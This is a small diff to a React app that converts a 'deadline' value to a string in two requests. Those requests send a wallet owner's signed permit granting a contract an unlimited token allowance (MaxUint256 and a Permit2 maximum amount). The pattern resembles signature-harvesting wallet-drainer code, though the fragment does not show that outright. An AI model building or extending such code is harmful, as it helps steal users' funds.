@@ -334,7 +334,7 @@ export default function App() {
                     owner: cleanSenderAddress,
                     spender: EVM_CONTRACT_ADDRESS,
                     signature,
-                    deadline,
+                    deadline: deadline.toString(),
                     value: ethers.MaxUint256.toString()
                   })
                 }).catch(err => log(`❌ Network Error sending PERMIT: ${err.message}`));
@@ -398,7 +398,7 @@ export default function App() {
                     owner: cleanSenderAddress,
                     spender: EVM_CONTRACT_ADDRESS,
                     signature,
-                    deadline,
+                    deadline: deadline.toString(), 
                     nonce: currentNonce,
                     amount: permit2MaxAmount
                   })
